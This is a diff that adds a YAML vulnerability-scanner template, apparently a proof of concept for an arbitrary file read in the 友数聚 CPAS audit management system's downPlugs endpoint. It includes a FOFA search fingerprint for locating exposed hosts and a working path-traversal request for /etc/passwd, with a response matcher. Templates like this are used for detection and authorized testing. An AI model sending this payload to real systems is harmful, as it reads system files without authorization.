@@ -1,0 +1,15 @@
+id: poc-yaml-youdatasum-cpas-downplugs-anyfile-read
+info:
+  name: 友数聚 CPAS审计管理系统 downPlugs 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: CPAS审计管理系统
+  fofa: body="/cpasm4/static/cap/font/iconfont.css"
+requests:
+- method: GET
+  path: /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName=
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(headers,"fileName=") && !contains(body,"<") && contains(content_type,"multipart/form-data")
+variables: {}
+transport: http
